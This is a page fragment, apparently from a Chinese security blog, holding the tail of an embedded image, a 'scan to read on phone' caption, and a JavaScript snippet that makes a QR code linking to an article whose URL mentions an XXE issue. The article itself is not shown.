fns8DKQ3ufnPnsA2EMj04Byvtgepd+oQ3uuu8vr1dTS/R8i19JrrHOIzD+EQ1A/h3ScX9YvqMNav8hAfcL+HPN7stT0hb7av/+12/gEAAP///+LbOgAAAAZJREFUAwDR5HfL6qk55wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ExamineNodCommisionDefault-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 